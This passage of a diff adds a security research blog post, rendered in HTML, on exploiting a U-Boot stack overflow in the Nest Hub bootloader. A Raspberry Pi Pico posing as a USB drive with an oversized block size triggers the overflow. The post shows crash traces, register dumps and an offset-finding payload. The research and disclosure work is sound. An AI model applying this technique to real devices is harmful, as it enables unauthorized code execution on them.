+    &lt;span class="cp"&gt;#7 0x43052a in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;, fuzzer::fuzzer_allocator&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt; &amp;gt; &amp;gt; const&amp;amp;) (/u-boot-elaine/fuzzer/fuzz+0x43052a)&lt;/span&gt;
+    &lt;span class="cp"&gt;#8 0x430bf5 in fuzzer::Fuzzer::Loop(std::vector&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;, fuzzer::fuzzer_allocator&amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt; &amp;gt; &amp;gt; const&amp;amp;) (/u-boot-elaine/fuzzer/fuzz+0x430bf5)&lt;/span&gt;
+    &lt;span class="cp"&gt;#9 0x426e00 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/u-boot-elaine/fuzzer/fuzz+0x426e00)&lt;/span&gt;
+    &lt;span class="cp"&gt;#10 0x44a412 in main (/u-boot-elaine/fuzzer/fuzz+0x44a412)&lt;/span&gt;
+    &lt;span class="cp"&gt;#11 0x7b733912f09a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2409a)&lt;/span&gt;
+    &lt;span class="cp"&gt;#12 0x420919 in _start (/u-boot-elaine/fuzzer/fuzz+0x420919)&lt;/span&gt;
+
+&lt;span class="n"&gt;Address&lt;/span&gt; &lt;span class="mh"&gt;0x7ffe6db4bb3f&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;located&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="kr"&gt;thread&lt;/span&gt; &lt;span class="n"&gt;T0&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="mi"&gt;607&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;
+    &lt;span class="cp"&gt;#0 0x5282ff in part_test_dos /u-boot-elaine/disk/part_dos.c:90&lt;/span&gt;
+
+  &lt;span class="n"&gt;This&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;607&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;__mbr&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="mi"&gt;92&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;==&lt;/span&gt; &lt;span class="n"&gt;Memory&lt;/span&gt; &lt;span class="n"&gt;access&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="mi"&gt;607&lt;/span&gt; &lt;span class="n"&gt;overflows&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="n"&gt;variable&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;AddressSanitizer detected a stack buffer overflow in &lt;strong&gt;part_test_dos&lt;/strong&gt;. This function is called to detect a DOS partition table when an USB Mass Storage device is connected.&lt;/p&gt;
+&lt;p&gt;It is interesting to note that, while the crash occurs in DOS partition layer, the invalid size at the origin of the crash is set by the USB Mass Storage layer. This suggests that it is unlikely to find this bug if layers are fuzzed independently.&lt;/p&gt;
+&lt;h2&gt;U-Boot stack overflow&lt;/h2&gt;
+&lt;p&gt;The crash is caused by a simple bug in function &lt;strong&gt;part_test_dos&lt;/strong&gt; :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;part_test_dos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;blk_desc&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;dev_desc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="p"&gt;[...]&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="n"&gt;ALLOC_CACHE_ALIGN_BUFFER&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;legacy_mbr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mbr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blk_dread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dev_desc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ulong&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;mbr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ol&gt;
+&lt;li&gt;Buffer &lt;em&gt;mbr&lt;/em&gt; of 512 bytes (&lt;strong&gt;sizeof&lt;/strong&gt;(&lt;em&gt;legacy_mbr&lt;/em&gt;)) is allocated on the stack.&lt;/li&gt;
+&lt;li&gt;Function &lt;strong&gt;blk_dread&lt;/strong&gt; reads 1 block at address 0 from block device &lt;em&gt;dev_desc&lt;/em&gt; and writes data to buffer &lt;em&gt;mbr&lt;/em&gt;. &lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;If block size (&lt;em&gt;dev_desc-&amp;gt;blksz&lt;/em&gt;) is larger than 512, function &lt;strong&gt;blk_dread&lt;/strong&gt; overflows buffer &lt;em&gt;mbr&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;As said before, block size can be controlled by attacker. But in practice, most USB flash drives have a block size of 512 bytes, and it cannot be customized easily. Let's build one instead.&lt;/p&gt;
+&lt;h1&gt;3. Exploitation device : CHIPICOPWN&lt;/h1&gt;
+&lt;p&gt;In order to exploit this bug in the Nest Hub bootloader, we need an USB Mass Storage device that supports larger-than-usual block size. One solution could be based on the &lt;a href="https://www.kernel.org/doc/html/latest/usb/mass-storage.html"&gt;Mass Storage Gadget from Linux USB Gadget framework&lt;/a&gt; with an USB OTG-enabled host (e.g. &lt;a href="https://www.khadas.com/vim3l"&gt;VIM3L SBC&lt;/a&gt; we used to &lt;a href="https://fredericb.info/2021/02/dump-amlogic-s905d3-bootrom-from-khadas-vim3l-board.html"&gt;dump the S905D3 bootROM&lt;/a&gt;. But there's a cheaper option.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.raspberrypi.com/products/raspberry-pi-pico/"&gt;Raspberry Pi Pico&lt;/a&gt; is a $4 microcontroller with USB Device support. It also has the great advantage of being supported by &lt;a href="https://github.com/hathach/tinyusb"&gt;TinyUSB, an open-source cross-platform USB Host/Device stack&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Raspberry Pi Pico board" src="https://fredericb.info/blog/elaine/rpi-pico-board-front.png" style="display: block;margin-left: auto;margin-right: auto;" width="600px"&gt;&lt;/p&gt;
+&lt;p&gt;TinyUSB project provides a &lt;a href="https://github.com/hathach/tinyusb/tree/master/examples/device/cdc_msc"&gt;Mass Storage device example code&lt;/a&gt; that can turn a Raspberry Pi Pico into a customizable USB flash drive. From this starting point, we can build an exploitation device that will :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;inject payload into stack memory&lt;/li&gt;
+&lt;li&gt;overwrite return address to execute payload&lt;/li&gt;
+&lt;li&gt;display a cool logo&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;However, due to the &lt;em&gt;black-box&lt;/em&gt; approach (no access to firmware), we still miss important information to develop the exploit. We'll go through several steps to collect all the information required to craft our final payload.&lt;/p&gt;
+&lt;h2&gt;3.1 Proof-of-Crash&lt;/h2&gt;
+&lt;p&gt;We start by verifying if the device is actually vulnerable to the bug. Using the &lt;a href="https://github.com/hathach/tinyusb/tree/4bfab30c02279a0530e1a56f4a7c539f2d35a293/examples/device/cdc_msc"&gt;Mass Storage device example code&lt;/a&gt; as starting point, we &lt;a href="https://github.com/frederic/chipicopwn/commit/c576f382b6ada027aab592ede525db1405f79cf4"&gt;change the block size to 1024 instead of 512&lt;/a&gt; to confirm if we observe a crash.&lt;/p&gt;
+&lt;p&gt;When connected to our host, the Raspberry Pi Pico is now detected as Mass Storage with &lt;em&gt;"1024-byte logical blocks"&lt;/em&gt; :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;usb &lt;span class="m"&gt;1&lt;/span&gt;-2: New USB device found, &lt;span class="nv"&gt;idVendor&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;cafe, &lt;span class="nv"&gt;idProduct&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4003&lt;/span&gt;, &lt;span class="nv"&gt;bcdDevice&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;.00
+usb &lt;span class="m"&gt;1&lt;/span&gt;-2: New USB device strings: &lt;span class="nv"&gt;Mfr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="nv"&gt;Product&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;, &lt;span class="nv"&gt;SerialNumber&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;
+usb &lt;span class="m"&gt;1&lt;/span&gt;-2: Product: TinyUSB Device
+usb &lt;span class="m"&gt;1&lt;/span&gt;-2: Manufacturer: TinyUSB
+usb &lt;span class="m"&gt;1&lt;/span&gt;-2: SerialNumber: &lt;span class="m"&gt;123456789012&lt;/span&gt;
+usb-storage &lt;span class="m"&gt;1&lt;/span&gt;-2:1.0: USB Mass Storage device detected
+scsi host0: usb-storage &lt;span class="m"&gt;1&lt;/span&gt;-2:1.0
+scsi host0: scsi scan: INQUIRY result too short &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, using &lt;span class="m"&gt;36&lt;/span&gt;
+scsi &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: Direct-Access     TinyUSB  Mass Storage     &lt;span class="m"&gt;1&lt;/span&gt;.0  PQ: &lt;span class="m"&gt;0&lt;/span&gt; ANSI: &lt;span class="m"&gt;2&lt;/span&gt;
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: Attached scsi generic sg0 &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt; &lt;span class="m"&gt;1024&lt;/span&gt;-byte logical blocks: &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;.4 kB/16.0 KiB&lt;span class="o"&gt;)&lt;/span&gt;
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Write Protect is off
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Mode Sense: &lt;span class="m"&gt;03&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; No Caching mode page found
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Assuming drive cache: write through
+ sda:
+sd &lt;span class="m"&gt;0&lt;/span&gt;:0:0:0: &lt;span class="o"&gt;[&lt;/span&gt;sda&lt;span class="o"&gt;]&lt;/span&gt; Attached SCSI removable disk
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When connected to the device booted in recovery mode, the Pico causes an exception, and registers are dumped over UART :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Synchronous Abort&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;esr&lt;/span&gt; &lt;span class="mh"&gt;0x02000000&lt;/span&gt;
+&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ffffffff8110e000&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;ffffffff8110e000&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;reloc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x0&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000002&lt;/span&gt; &lt;span class="nl"&gt;x1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x2&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x3&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x4&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5b00&lt;/span&gt; &lt;span class="nl"&gt;x5&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffffffffffff8&lt;/span&gt;
+&lt;span class="nl"&gt;x6&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000000&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
+&lt;span class="nl"&gt;x10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c0021b0&lt;/span&gt; &lt;span class="nl"&gt;x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009b80&lt;/span&gt;
+&lt;span class="nl"&gt;x12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
+&lt;span class="nl"&gt;x14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5c4c&lt;/span&gt; &lt;span class="nl"&gt;x15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt;
+&lt;span class="nl"&gt;x16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000004060&lt;/span&gt; &lt;span class="nl"&gt;x17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;00000000000000&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;
+&lt;span class="nl"&gt;x18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bee1dc8&lt;/span&gt; &lt;span class="nl"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000002&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="nl"&gt;x23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt;
+&lt;span class="nl"&gt;x24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt; &lt;span class="nl"&gt;x25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;000000007ff&lt;/span&gt;&lt;span class="n"&gt;dcd80&lt;/span&gt;
+&lt;span class="nl"&gt;x26&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt; &lt;span class="nl"&gt;x27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009ac0&lt;/span&gt; &lt;span class="nl"&gt;x29&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+
+&lt;span class="n"&gt;Resetting&lt;/span&gt; &lt;span class="n"&gt;CPU&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This indicates with great certainty that the device is vulnerable to our bug. Register values will be very helpful to develop the exploit. Unfortunately, &lt;em&gt;sp&lt;/em&gt; register value is missing, so we'll have to do extra work to locate our payload in the stack. Still, we have obtained the global data pointer &lt;em&gt;gd&lt;/em&gt; which is &lt;a href="https://u-boot.readthedocs.io/en/latest/develop/global_data.html"&gt;stored in register &lt;em&gt;x18&lt;/em&gt;&lt;/a&gt;. And we can learn from U-Boot source code that stack top is located below &lt;em&gt;gd&lt;/em&gt;.&lt;/p&gt;
+&lt;h2&gt;3.2 Offset of payload address&lt;/h2&gt;
+&lt;p&gt;The bug allows to overflow a buffer on the stack to overwrite a return address. First, we look for the offset in our payload that will overwrite that return address. For that, we create a &lt;a href="https://github.com/frederic/chipicopwn/blob/main/payloads/poc_step1.S"&gt;payload filled with incremental invalid pointers&lt;/a&gt; :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
+&lt;span class="na"&gt;.global&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFC00&lt;/span&gt;
+&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFC01&lt;/span&gt;
+&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFC02&lt;/span&gt;
+&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="na"&gt;.word&lt;/span&gt; &lt;span class="mi"&gt;0xFFFFFFFF&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then, we &lt;a href="https://github.com/frederic/chipicopwn/commit/42ced2f16d4c7f64f74d6d6d13e93d85a72c8ba7"&gt;modify the Pico code&lt;/a&gt; to use this payload as the block 0 of the block device. The device crashes again :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Synchronous Abort&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;handler&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;esr&lt;/span&gt; &lt;span class="mh"&gt;0x8a000000&lt;/span&gt;
+&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8f8110dc8e&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8f8110dc8e&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;reloc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="nl"&gt;elr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8ffffffc8e&lt;/span&gt; &lt;span class="nl"&gt;lr&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc8ffffffc8e&lt;/span&gt;
+&lt;span class="nl"&gt;x0&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt; &lt;span class="nl"&gt;x1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
+&lt;span class="nl"&gt;x2&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5888&lt;/span&gt; &lt;span class="nl"&gt;x3&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x4&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000001000&lt;/span&gt; &lt;span class="nl"&gt;x5&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000200&lt;/span&gt;
+&lt;span class="nl"&gt;x6&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffffffffffffe&lt;/span&gt; &lt;span class="nl"&gt;x7&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000000&lt;/span&gt;
+&lt;span class="nl"&gt;x8&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x9&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000000&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
+&lt;span class="nl"&gt;x10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c0021b0&lt;/span&gt; &lt;span class="nl"&gt;x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c009b80&lt;/span&gt;
+&lt;span class="nl"&gt;x12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt; &lt;span class="nl"&gt;x13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000000001&lt;/span&gt;
+&lt;span class="nl"&gt;x14&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bed5c4c&lt;/span&gt; &lt;span class="nl"&gt;x15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;00000000ff&lt;/span&gt;&lt;span class="n"&gt;ffffff&lt;/span&gt;
+&lt;span class="nl"&gt;x16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;0000000000004060&lt;/span&gt; &lt;span class="nl"&gt;x17&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;00000000000000&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;
+&lt;span class="nl"&gt;x18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;bee1dc8&lt;/span&gt; &lt;span class="nl"&gt;x19&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc91fffffc90&lt;/span&gt;
+&lt;span class="nl"&gt;x20&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc93fffffc92&lt;/span&gt; &lt;span class="nl"&gt;x21&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fffffc95fffffc94&lt;/span&gt;
+&lt;span class="nl"&gt;x22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000000000002&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="nl"&gt;x23&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mo"&gt;000000007&lt;/span&gt;&lt;span class="n"&gt;c008490&lt;/span&gt;
